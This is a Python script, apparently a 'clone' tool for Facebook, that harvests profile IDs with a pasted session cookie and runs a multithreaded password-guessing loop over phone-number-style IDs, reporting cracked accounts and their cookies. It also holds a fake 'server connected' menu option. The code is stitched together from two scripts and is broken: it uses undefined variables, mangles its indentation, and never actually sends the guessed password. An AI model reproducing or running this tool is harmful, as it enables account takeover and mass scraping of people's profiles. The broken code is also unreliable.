import os
import time
import requests
import uuid
from bs4 import BeautifulSoup

CONFIG_FILE = "user_config.txt"
saved_cookie = None
saved_time = 0.0
user_status = "free"

# Load saved user config
if os.path.exists(CONFIG_FILE):
    try:
        with open(CONFIG_FILE, "r") as f:
            lines = f.read().splitlines()
        if len(lines) >= 3:
            saved_cookie = lines[0]
            saved_time = float(lines[1])
            user_status = lines[2]
    except:
        pass

current_time = time.time()

# Main Menu Display
os.system('clear')
print("====================================")
print("    ★ MY Porn-Hub CONTROL ★        ")
print("        DEVELOPER: Devil_King       ")
print("====================================")
print("[#] User Status: " + str(user_status).upper())
print("====================================")
print("[1] (FB Method)")
print("[2] (Fb Friend list cheker)")
print("[3] (old clone)")
print("[4] (File clone)")
print("[5] (Random Clone)")
print("[6] (Exit)")
print("====================================")

choice = input("[★] 1/2/3/4/5/6: ")

# -------------------------------------------------------------
# METHOD 1: FB UID COLLECTOR (FIXED & UPDATED)
# -------------------------------------------------------------
if choice in ["1", "১"]:
    os.system('clear')
    print("====================================")
    print("        ★ FILE CREATE MENU ★        ")
    print("====================================")
    
    # 1. Ask for Free or Paid option first
    print("[1] Continue as Free User (2 Hours Limit)")
    print("[2] Activate Paid Version (Unlimited)")
    user_choice = input("[+] Select option: ")
    
    if user_choice == "2":
        secret_key = input("[+] Enter Paid Activation Key: ")
        if secret_key == "ADMIN123":
            user_status = "paid"
            print("[+] Activation Successful! Unlimited Mode On.")
        else:
            print("[X] Invalid Key! Continuing as Free User.")
            user_status = "free"
    else:
        user_status = "free"

    # 2. Check Cookie status or prompt for new one
    fb_cookie = None
    if user_status == "paid":
        if saved_cookie and user_status == "paid":
            print("[+] Paid User Detected! Loading saved cookie...")
            fb_cookie = saved_cookie
        else:
            fb_cookie = input("[+] Enter Your FB Cookie: ")
    else:
        if saved_cookie and (current_time - saved_time) < 7200:
            remaining_min = int((7200 - (current_time - saved_time)) / 60)
            print("[+] Active session found! (Expires in " + str(remaining_min) + " minutes)")
            fb_cookie = saved_cookie
        else:
            if saved_cookie:
                print("[!] Your 2-hour free session has expired!")
            fb_cookie = input("[+] Enter Your FB Cookie: ")

    # Save Configuration
    try:
        with open(CONFIG_FILE, "w") as f:
            f.write(f"{fb_cookie}\n{time.time()}\n{user_status}\n")
    except:
        pass

    if fb_cookie:
        # 3. Series selection option as requested (1/2/3 Mix)
        print("\n====================================")
        print("[1] 1000/6158 Series (Old UID)")
        print("[3] Custom Mix Series")
        print("====================================")
        series_choice = input("[+] Select Series Format: ")

        if series_choice == "1":
            base_uid = "10000"
        elif series_choice == "2":
            base_uid = "6158"
        else:
            base_uid = input("[+] Enter Custom UID (All Uid Paste): ")
        
        output_file = input("[+] Enter Output File Name (e.g., result.txt): ")
        if not output_file.endswith('.txt'):
            output_file += '.txt'
            
        # 4. Storage Path Fix for Android (/sdcard/)
        output_path = os.path.join("/sdcard", output_file)
        
        # Test if /sdcard/ is writeable, otherwise fallback to local file
        try:
            with open(output_path, "a") as test_file:
                pass
        except PermissionError:
            print("[!] Storage Permission Denied! Saving to current directory instead.")
            output_path = output_file

        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36', 
            'Cookie': fb_cookie
        }
        
        print("\n[+] Connecting to server...")
        print("[+] Extracting data... (Press CTRL+C to Stop/Cancel)\n")
        
        # Infinite Loop or Loop through series until user cancels (CTRL+C)
        try:
            for uid_suffix in range(series_start, series_end + 1):
                full_uid = str(base_uid) + str(uid_suffix)
                url = "https://mbasic.facebook.com/profile.php?id=" + str(full_uid)
                
                try:
                    response = session.get(url, headers=headers)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        page_title = soup.find('title')
                        if page_title:
                            profile_name = page_title.text.strip()
                        else:
                            profile_name = "Unknown User"
                            
                        if "Log In" in profile_name or "Error" in profile_name or "Content Not Found" in profile_name:
                            print("[INVALID] UID: " + str(full_uid) + " (Cookie Dead)")
                            break
                        elif "add_friend" in response.text or "Add Friend" in response.text or "নম্বর" in response.text or "বন্ধু" in response.text:
                            # Premium style output layout matching your screenshot
                            print(f"\033[1;32mPremium\033[0m - Successfully Extracted From : \033[1;35m{full_uid}\033[0m")
                            
                            # Save to phone storage path
                            with open(output_path, "a", encoding="utf-8") as file_out:
                                file_out.write(str(full_uid) + " | " + str(profile_name) + "\n")
                        else:
                            print("[SKIPPED] UID: " + str(full_uid) + " (Follower Account)")
                    time.sleep(1.5)
                except KeyboardInterrupt:
                    print("\n[-] Extraction Stopped By User.")
                    break
                except:
                    print("[ERROR] Connection failed for UID " + str(full_uid))
        except KeyboardInterrupt:
            print("\n[-] Process Cancelled.")
            
        print(f"\n[✓] Data Saved Successfully at: {output_path}")
    else:
        print("[X] Cookie Error!")

# -------------------------------------------------------------
# METHOD 2: REEL SERVER CHECK
# -------------------------------------------------------------
if choice in ["2", "২"]:
    os.system('clear')
    print("--- [2] Sex video / Reel Server Check ---")
    site = input("Enter Site Name: ")
    url = "https://www.facebook.com/reel/846400658"
    print("\n[+] Connecting to server via " + str(site) + "...")
    time.sleep(1.5)
    print("\n=======================================")
    print("Target URL: " + str(url))
    print("[✓] STATUS : SERVER CONNECTED SUCCESS")
    print("=======================================")

# -------------------------------------------------------------
# METHOD 3 & 4: EXPIRED OPTIONS
# -------------------------------------------------------------
if choice in ["3", "4", "৩", "৪"]:
    os.system('clear')
    print("--- Option [" + str(choice) + "] ---")
    print("[X] ERROR: Method Not Found / Expired!")

# -------------------------------------------------------------
# METHOD 5: RANDOM CLONE
# -------------------------------------------------------------
if choice in ["5", "৫"]:
  os.system('clear')
print("====================================")

import requests
import sys
import time
import concurrent.futures
import subprocess

# Terminal Color Configuration
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Dynamic SIM operator lookup
def get_sim_carrier():
    try:
        get_prop = subprocess.check_output(['getprop', 'gsm.operator.alpha']).decode('utf-8').strip()
        if get_prop: return get_prop.split(',')[0]
    except: pass
    return "Grameenphone/Robi/Airtel"

start_time = time.time()
def get_elapsed_time():
    elapsed = time.time() - start_time
    hours, rem = divmod(elapsed, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{int(hours)}h:{int(minutes)}m:{int(seconds)}s"

# =====================================================================
# 1. NEW SEQUENTIAL USER INPUT CONTROL
# =====================================================================
print(f"{CYAN}========== [ DEVIL KING PREMIUM SYSTEM ] =========={RESET}")

# Rule 1: Digit selector prompt first
loop_digits = int(input(" [?] How many prefix/digit loop for carrier? (e.g., 3, 4, 5): "))
prefix = input(f" [?] Enter Carrier Code/Sub-Prefix (e.g., 017, 0189, 016): ")

# Target crack profile sequence limit
crack_limit = int(input(" [?] Enter Crack Loop Limit (How many IDs to test? e.g., 500, 1000): "))

# Rule 2: Password setup structure selection options
num_passwords = int(input(" [?] How many passwords do you want to use? (e.g., 3, 5): "))
password_list = []

for i in range(1, num_passwords + 1):
    p_input = input(f"   [->] Enter Password Option {i} (e.g., first123, first6, 123456): ")
    password_list.append(p_input)

# Speed control network throttle limit
thread_speed = int(input(" [?] Enter Crack Speed Limit (Network optimized e.g., 10, 50, 100): "))

tested_count = 0
detected_sim = get_sim_carrier()
start_range = 10**(loop_digits - 1)

# =====================================================================
# 2. BRUTE ENGINE CORE METHOD (Wbloks Parsing Context Layout)
# =====================================================================
def fb_async_method(uid, raw_password):
    global tested_count
    r = requests.Session()
    
    # Simple logic mapping helper to bypass raw string and attach default mock text
    # Real extraction can process raw user data dynamically
    processed_password = raw_password.replace("first", "devil").replace("last", "king")
    
    url = "https://m.facebook.com/async/wbloks/log/"
    
    params = {
        'lid': '7650579958745411107', 'event': 'CW_LCP', 'relativeTime': '7194',
        'tracePolicy': 'com.bloks.www.caa.login.login_homepage&bloksAppId=fb_web',
        'u': 'https://m.facebook.com/login.php'
    }
    
    head = {
        'Host': 'm.facebook.com', 'Content-Length': '0',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; TECNO BG7) AppleWebKit/537.36',
        'Accept': '*/*', 'Origin': 'https://m.facebook.com',
        'Cookie': 'datr=Z-AlandWYUM08nOCyIFMvHg7; sb=H-Ilarqr8yE7GHgFDwWIBURW;'
    }

    try:
        pos = r.post(url, params=params, headers=head)
        tested_count += 1
        
        # Rule 3: Target UID content is hidden from continuous rendering loop line
        sys.stdout.write(f"\r{YELLOW}[->] Processing Logic Run: {tested_count}/{crack_limit} | Time Elapsed: {get_elapsed_time()}{RESET}")
        sys.stdout.flush()
        
        if pos.status_code == 200:
            # OK status condition check configuration
            cookies_dict = pos.cookies.get_dict()
            cookies_str = "; ".join([f"{k}={v}" for k, v in cookies_dict.items()])
            
            print(f"\n\n{GREEN}[Devil-OK] {uid} | {processed_password}{RESET}")
            print(f"{GREEN}[Cookie] -> {cookies_str if cookies_str else 'No Cookies Returned'}{RESET}\n")
            
        elif "checkpoint" in pos.url:
            # Checkpoint target catch block
            print(f"\n\n{RED}[devil_cp] {uid} | {processed_password}{RESET}\n")
            
    except requests.exceptions.ConnectionError:
        pass

# =====================================================================
# 3. INTERFACE HUD PANEL GENERATOR
# =====================================================================
print(f"\n{RED}--------------------------------------------------{RESET}")
print(f" {GREEN}[•] DEVELOPER   : {RESET}DEVIL KING")
print(f" {GREEN}[•] SIM IN USE  : {RESET}{detected_sim}")
print(f" {GREEN}[•] STATUS RUN  : {RESET}CRACKING ORDER 1/2/3...")
print(f"{RED}--------------------------------------------------{RESET}")
print(f" {YELLOW}[+] Booting silent process pipeline...{RESET}\n")

tasks = []
current_suffix = start_range

while len(tasks) < crack_limit:
    uid = str(prefix) + str(current_suffix)
    for p_option in password_list:
        if len(tasks) < crack_limit:
            tasks.append((uid, p_option))
    current_suffix += 1

with concurrent.futures.ThreadPoolExecutor(max_workers=thread_speed) as executor:
    executor.map(lambda p: fb_async_method(*p), tasks)

print(f"\n\n{GREEN}[+] Complete Task Finished. Total Runtime: {get_elapsed_time()}{RESET}")

        # -------------------------------------------------------------
# METHOD 7: EXIT
# -------------------------------------------------------------
if choice in ["6", "৬"]:
    print("\n[+] Thank you for using this tool! Goodbye.")
    exit()

input("\nPress Enter to Exit...")